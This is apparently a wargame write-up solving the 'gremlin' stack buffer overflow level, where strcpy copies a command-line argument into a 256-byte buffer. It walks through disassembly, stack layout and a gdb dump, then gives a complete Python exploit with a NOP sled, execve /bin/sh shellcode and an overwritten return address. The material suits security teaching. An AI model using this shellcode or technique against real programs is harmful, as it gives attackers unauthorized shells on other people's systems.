# Vulnerability
In gate's home directory, There is a file named as gremlin, and C code is provided, too.
```c
char buffer[256];
strcpy(buffer, argv[1]);
```
It uses strcpy to copy argv[1] to buffer[256].

strcpy() function doesn't check parameter's length so I can overwrite gremlin's SFP & RET Address.

# Exploitation
To check whether dummy bytes exist or not, disassemble gremlin's main function:
```assembly
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %esp,%ebp
0x8048433 <main+3>:	sub    $0x100,%esp
```
It only uses ```0x100```(256) bytes, No any dummy bytes.

Then, the structure of gremlin would be like:
```
---------------------------------
| buffer[256] | SFP[4] | RET[4] |
---------------------------------
```

I will write NOP & Shellcode into buffer and modify RET address to buffer's address.
```
----------------------------------------------------------------------------
| NOP[100] + Shellcode[25] + NOP[131] | SFP[4] | RET[4] (buffer's address) |
----------------------------------------------------------------------------
```

Now, I only need buffer's address which will be written into RET.
```
(gdb) x/32x $esp-244
0xbffff878:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff888:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff898:	0x90909090	0x90909090	0x90909090	0x90909090
```

# Payload
```python
import os
from struct import *

payload = ""
payload = payload + "\x90" * 100
payload = payload + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload = payload + "\x90" * 131
payload = payload + "AAAA" # SFP
payload = payload + "\x78\xf8\xff\xbf" # RET

os.execv('/home/gate/gremlin', ["", payload])
```
